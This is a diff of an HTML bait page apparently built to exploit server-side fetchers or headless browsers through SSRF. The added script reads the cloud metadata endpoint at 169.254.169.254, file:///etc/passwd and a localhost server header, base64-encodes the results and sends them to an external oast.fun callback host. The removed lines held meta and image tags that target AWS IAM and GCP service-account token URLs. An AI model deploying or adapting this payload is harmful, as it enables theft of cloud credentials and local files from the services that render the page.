@@ -1,24 +1,38 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>Infrastructure Test</title>
-
-    <meta http-equiv="refresh" content="0; url=http://esqbwjbyepcxrsacleqfj8d083r6aniqm.oast.fun/redirected">
-
-    <meta property="og:image" content="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
-    
-    <meta property="twitter:image" content="http://127.0.0.1/server-status">
-    
-    <meta name="twitter:image" content="http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">
-
-    <link rel="icon" href="http://esqbwjbyepcxrsacleqfj8d083r6aniqm.oast.fun/favicon_leak">
+    <title>Impact Search</title>
 </head>
 <body>
-    <h1>Redirecting...</h1>
     <script>
-        // На всякий случай, если бот умеет в JS (редко, но бывает)
-        window.location.href = "http://esqbwjbyepcxrsacleqfj8d083r6aniqm.oast.fun/js_redirect";
+        const oast = "http://esqbwjbyepcxrsacleqfj8d083r6aniqm.oast.fun";
+
+        // Функция для отправки награбленного тебе
+        function sendLeakedData(key, data) {
+            fetch(`${oast}/leak?${key}=${btoa(data)}`);
+        }
+
+        // 1. Пытаемся прочитать метаданные облака (если это VK Cloud/OpenStack)
+        fetch("http://169.254.169.254/latest/meta-data/hostname")
+            .then(r => r.text())
+            .then(t => sendLeakedData("cloud_host", t))
+            .catch(e => fetch(`${oast}/err_cloud`));
+
+        // 2. Пытаемся прочитать локальный файл через классический SSRF вектор
+        // (Работает, если Chrome запущен с флагом --allow-file-access-from-files)
+        fetch("file:///etc/passwd")
+            .then(r => r.text())
+            .then(t => sendLeakedData("passwd", t))
+            .catch(e => fetch(`${oast}/err_file`));
+
+        // 3. Просто дергаем локалхост и смотрим заголовок сервера
+        fetch("http://127.0.0.1:80")
+            .then(r => {
+                const server = r.headers.get("Server");
+                sendLeakedData("local_server", server || "unknown");
+            });
     </script>
+    
+    <img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
 </body>
 </html>
